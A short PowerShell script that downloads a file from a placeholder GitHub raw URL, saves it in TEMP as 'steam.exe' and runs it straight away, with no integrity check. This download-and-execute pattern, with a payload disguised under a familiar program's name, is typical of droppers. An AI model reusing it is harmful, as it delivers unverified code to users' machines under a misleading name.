$url = "https://raw.githubusercontent.com/user/repo/main/file.ext"

$tempPath = Join-Path $env:TEMP "steam.exe"

Write-Host "Downloading..." -ForegroundColor Cyan

try {
    Invoke-WebRequest `
        -Uri $url `
        -OutFile $tempPath `
        -ErrorAction Stop

    if (Test-Path $tempPath) {

        Write-Host "Download completed." -ForegroundColor Green

        Write-Host "Launching..." -ForegroundColor Green

        Start-Process `
            -FilePath $tempPath `
            -Wait

        Write-Host "Completed." -ForegroundColor Green
    }
    else {
        Write-Host "Download failed: file not found." -ForegroundColor Red
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
